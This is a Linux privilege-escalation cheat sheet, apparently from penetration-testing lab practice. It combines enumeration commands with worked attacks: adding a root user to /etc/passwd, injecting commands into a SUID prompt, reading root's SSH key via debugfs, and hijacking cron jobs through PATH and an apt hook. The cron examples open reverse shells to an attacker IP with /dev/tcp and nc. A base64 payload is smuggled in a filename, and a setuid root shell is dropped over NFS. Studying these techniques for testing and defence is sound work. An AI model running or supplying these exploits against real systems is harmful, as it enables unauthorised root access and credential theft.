#!/usr/bin/peno

#useful links
https://gtfobins.github.io/gtfobins/find/

# Getting the version of the running operating system and architecture
cat /etc/issue
cat /etc/*-release
uname -a

#Enumerate IP-Adresses
cat /etc/sysconfig/network-scripts/ifcfg-eth0 | grep IP

#Getting a list of running processes on Linux
ps axu

#Inspecting the cron log file
grep "CRON" /var/log/cron.log

#Listing the full TCP/IP configuration on all available adapters on Linux
ip a

#Printing the routes on Linux
/sbin/route

#checking the writable permissions on /etc/apt/apt.conf.d
ls -ld /etc/apt/apt.conf.d


#Listing all active network connections on Linux
ss -anp


#Writable Directory
find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \; 2>/dev/null


#discovering that this user can write to usr/local/bin.
find / -writable -type d -prune -o -name /home/chloe -prune -o -name /var/lib/gitea 2>/dev/null

# Listing all cron jobs on Linux
ls -lah /etc/cron*
cat /etc/crontab

# Listing all installed packages on a Debian Linux operating system
dpkg -l

#Listing all world writable directories on Linux
find / -writable -type d 2>/dev/null

#Caps
getcap -r / 2>/dev/null

#Listing content of /etc/fstab and all mounted drives on Linux
cat /etc/fstab
mount

#Listing all available drives using lsblk on Linux
/bin/lsblk

#Listing loaded drivers on Linux
lsmod

#Listing additional information about a module on Linux
/sbin/modinfo libata

# Searching for SUID files on Linux
find / -perm -u=s -type f 2>/dev/null
find / -type f -perm -4200 2>/dev/null

#Tools
#https://pentestmonkey.net/tools/audit/unix-privesc-check
./unix-privesc-check standard > output.txt

#Escalating privileges by editing /etc/passwd
openssl passwd evil -->Output: AK24fcSx2Il3I
echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2 --> Root

#Code-GCC Compile
gcc 43418.c -o exploit

#Process monitoring
https://github.com/DominicBreuker/pspy/releases

#Dumping Firefox Saved Passwords
find / -type f -user elliot 2>/dev/null | grep -v "/proc/" | grep -v "/sys/"

#SUID example
$ ./get-list
Which List do you want to open? [customers/employees]: employees;ls
$ ./get-list
Which List do you want to open? [customers/employees]: ../../etc/shadow #employees

#df Example

$ id
uid=1002(sysadmin) gid=1002(sysadmin) groups=1002(sysadmin),6(disk)
$ df -h
udev            1.9G     0  1.9G   0% /dev
tmpfs           390M  1.9M  388M   1% /run
/dev/sda5        20G  7.8G   11G  43% /

$ debugfs /dev/sda5
debugfs:  cd /root/.ssh
debugfs:  cat id_rsa


#Cron-Job Example:
#The first thing we notice here is that the PATH variable is specified with a new directory added: /dev/shm.
#We also see a cronjob listed in the crontab file that executes netstat as the root user every minute, along with other commands. We'll note that the full path (/usr/bin/netstat) is not specified for this binary; 
#therefore, the system will search the PATH variable for the location of the binary.

www-data@muddy:/$ cat /etc/crontab
cat /etc/crontab
...
SHELL=/bin/sh
PATH=/dev/shm:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
...
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    netstat -tlpn > /root/status && service apache2 status >> /root/status && service mysql status >> /root/status
...
www-data@muddy:/$

www-data@muddy:/$ cd /dev/shm
cd /dev/shm
www-data@muddy:/dev/shm$ cat <<EOF>> ./netstat
cat <<EOF>> ./netstat
> #!/bin/bash
#!/bin/bash
> /bin/bash -i >& /dev/tcp/192.168.118.14/4444 0>&1
/bin/bash -i >& /dev/tcp/192.168.118.14/4444 0>&1
> EOF
EOF
www-data@muddy:/dev/shm$ chmod +x netstat
chmod +x netstat
www-data@muddy:/dev/shm$ 

#Other Cron example:
#As the service runs as root we can execute malicious commands via the apt package manager.
#We begin by checking the writable permissions on /etc/apt/apt.conf.d:

cat /etc/crontab

SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed 

* * * * * root apt-get update
* * * * * root /root/run.sh

-->
ls -ld /etc/apt/apt.conf.d
-rwxrwxrwx. 1 root root 1338 Apr 28 13:45 /etc/apt/apt.conf.d
bash-4.2$
-->
echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <My-IP> 1234 >/tmp/f"};' > shell

#Other Example:
#Running pspy we see a cron running as root.
2022/08/22 18:34:01 CMD: UID=0    PID=2147   | /bin/sh -c /bin/bash /usr/bin/clean-tmp.sh 
2022/08/22 18:34:01 CMD: UID=0    PID=2149   | /bin/bash /usr/bin/clean-tmp.sh 
jane@assignment:~$ cat /usr/bin/clean-tmp.sh 
#! /bin/bash
find /dev/shm -type f -exec sh -c 'rm {}' \;
jane@assignment:/tmp$ touch /dev/shm/'$(echo -n Y2htb2QgdStzIC9iaW4vYmFzaA==|base64 -d|bash)'
jane@assignment:/tmp$ bash -p
bash-5.0# whoami
root

#Other Example:
#To determine the privileges of the network group, we can use the find command.
#We see that we have write access to the /etc/hosts file. We modify the IP address of localhost in the /etc/hosts file to our attacker IP.
#we proceed to mount the share onto our attack machine.
liam@lunar:~$ find / -xdev -group network 2>/dev/null
/etc/hosts

liam@lunar:~$ ls -la /etc/hosts
-rw-rwxr-- 1 root network 36 Apr 29 20:40 /etc/hosts

--> 
liam@lunar:~$ cat /etc/hosts
#127.0.0.1       localhost
192.168.1.99    locahost

-->
┌──(kali@kali)-[/tmp/]
└─# sleep 60 && mount -t nfs 192.168.1.33:/srv/share /tmp/share

┌──(kali@kali)-[/tmp/]
└─# cd share && ls -la

drwxrwxrwx  2 root   root       4096 Apr 30 12:29 .
drwxrwxrwt 15 root   root      20480 Apr 30 13:39 ..
-rw-rw-rw-  1 nobody nogroup 1280255 Apr 30 12:28 web-backup.zip

--> create the following bash.c 
┌──(kali@kali)-[/tmp]
└─# nano bash.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main()
{
setuid(0);
system("/bin/bash");
return 0;
}

-->
┌──(kali@kali)-[/tmp]
└─# sudo cp bash share/

┌──(kali@kali)-[/tmp/share]
└─# sudo chmod +s bash

liam@lunar:/$ cd /srv/share/
liam@lunar:/srv/share$ ./bash

root@lunar:/srv/share# whoami
root


